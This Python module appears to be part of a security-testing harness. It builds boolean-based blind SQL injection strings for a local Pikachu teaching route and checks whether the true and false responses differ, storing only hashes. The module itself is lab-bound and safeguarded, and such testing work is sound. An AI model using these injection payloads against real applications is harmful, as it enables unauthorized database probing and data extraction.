"""Read-only boolean-result oracle for the local Pikachu blind-b route.

The true/false values are assembled only at send time from a known local
fixture and quote/operator tokens.  The persisted result contains hashes and
bounded row-marker projections, never the executable runtime value.
"""

from __future__ import annotations

import hashlib
import json
from typing import Any, Mapping

from .maze_engine import sha256_json


PG221_SCHEMA = "pg221-pikachu-boolean-result-oracle-v1"
ROUTE = "/vul/sqli/sqli_blind_b.php"


def build_boolean_value(*, base: str = "kobe", truth: bool) -> str:
    """Build a short-lived string predicate for the local teaching route."""

    if str(base) != "kobe":
        raise ValueError("PG-221 only accepts the local public fixture selector")
    quote = chr(39)
    bit = "1" if bool(truth) else "2"
    # No comment, write, subquery, delay, or external callback is used.
    # The application appends the closing delimiter around ``name`` when it
    # builds ``username='$name'``.  Do not emit a second trailing quote here:
    # doing so turns both branches into a malformed/always-empty expression
    # and makes the oracle diagnose the runtime as if it were a dead end.
    return "".join((base, quote, " AND ", quote, "1", quote, "=", quote, bit))


def project_boolean_response(response: Any, *, truth: bool) -> dict[str, Any]:
    """Project only the row/absence shape from a blind-b response."""

    body = str(getattr(response, "text", "") or "").casefold()
    content = bytes(getattr(response, "content", b"") or b"")
    row_marker_count = min(body.count("your uid") + body.count("uid:") + body.count("email is"), 3)
    projection = {
        "status_code": int(getattr(response, "status_code", 0) or 0),
        "status_class": f"{int(getattr(response, 'status_code', 0) or 0) // 100}xx",
        "body_length_bucket": "0" if not content else "1-255" if len(content) <= 255 else "256-4095" if len(content) <= 4095 else "4096-65535" if len(content) <= 65535 else "65536+",
        "row_marker_count": row_marker_count,
        "result_shape": "record_present" if row_marker_count else "record_absent",
        "body_sha256": hashlib.sha256(content).hexdigest(),
        "truth_label": "true" if truth else "false",
    }
    projection["projection_sha256"] = sha256_json(projection)
    return {"schema_version": PG221_SCHEMA, "response_projection": projection, "raw_response_retained": False}


def evaluate_boolean_effect(
    *,
    route: Mapping[str, Any],
    true_candidate: Mapping[str, Any],
    false_candidate: Mapping[str, Any],
    true_reference: Mapping[str, Any],
    false_reference: Mapping[str, Any],
    negative: Mapping[str, Any],
    reset: Mapping[str, Any],
    source_hash: str,
) -> dict[str, Any]:
    reasons: list[str] = []
    if str(route.get("path")) != ROUTE or str(route.get("method", "GET")).upper() != "GET":
        reasons.append("route_contract_mismatch")
    if not (reset.get("fresh_target") and reset.get("container_recreated") and not reset.get("container_restart_used") and int(reset.get("volume_mount_count", -1)) == 0 and reset.get("database_health_gate") == "mysqli_root_pikachu_ok"):
        reasons.append("fresh_database_reset_attestation_missing")
    source_hash = str(source_hash)
    if len(source_hash) != 64 or any(char not in "0123456789abcdef" for char in source_hash.casefold()):
        reasons.append("source_hash_invalid")
    tp = dict(true_candidate.get("response_projection") or {})
    fp = dict(false_candidate.get("response_projection") or {})
    tr = dict(true_reference.get("response_projection") or {})
    fr = dict(false_reference.get("response_projection") or {})
    neg = dict(negative.get("response_projection") or {})
    true_present = int(tp.get("row_marker_count", 0)) > 0
    false_absent = int(fp.get("row_marker_count", 0)) == 0
    ref_true_present = int(tr.get("row_marker_count", 0)) > 0
    ref_false_absent = int(fr.get("row_marker_count", 0)) == 0
    negative_clean = int(neg.get("row_marker_count", 0)) == 0
    if not true_present:
        reasons.append("true_branch_record_missing")
    if not false_absent:
        reasons.append("false_branch_record_present")
    if not ref_true_present or not ref_false_absent:
        reasons.append("reference_boolean_shape_mismatch")
    if not negative_clean:
        reasons.append("negative_control_record_present")
    candidate_differential = (tp.get("result_shape"), fp.get("result_shape")) == ("record_present", "record_absent")
    reference_differential = (tr.get("result_shape"), fr.get("result_shape")) == ("record_present", "record_absent")
    if not candidate_differential:
        reasons.append("candidate_boolean_differential_missing")
    if not reference_differential:
        reasons.append("reference_boolean_differential_missing")
    agreement = bool(true_present == ref_true_present and false_absent == ref_false_absent)
    if not agreement:
        reasons.append("candidate_reference_boolean_disagreement")
    positive = not reasons
    evidence = {
        "schema_version": PG221_SCHEMA,
        "route": str(route.get("path")),
        "method": str(route.get("method", "GET")).upper(),
        "source_sha256": source_hash,
        "true_candidate_shape": tp.get("result_shape"),
        "false_candidate_shape": fp.get("result_shape"),
        "true_reference_shape": tr.get("result_shape"),
        "false_reference_shape": fr.get("result_shape"),
        "negative_shape": neg.get("result_shape"),
        "candidate_boolean_differential": candidate_differential,
        "reference_boolean_differential": reference_differential,
        "candidate_reference_agreement": agreement,
        "database_write": False,
        "time_delay_used": False,
        "external_network": False,
        "raw_payload_strings_stored": False,
        "raw_response_bodies_stored": False,
    }
    evidence["evidence_hash"] = sha256_json(evidence)
    return {
        "schema_version": PG221_SCHEMA,
        "route": str(route.get("path")),
        "contract": {"kind": "boolean_result_differential", "read_only": True},
        "boolean_effect_confirmed": positive,
        "confirmed_positive": positive,
        "vulnerability_claim_allowed": False,
        "reasons": reasons,
        "evidence": evidence,
        "evidence_hash": evidence["evidence_hash"],
        "raw_payload_strings_stored": False,
        "raw_response_bodies_stored": False,
    }


__all__ = ["PG221_SCHEMA", "ROUTE", "build_boolean_value", "evaluate_boolean_effect", "project_boolean_response"]
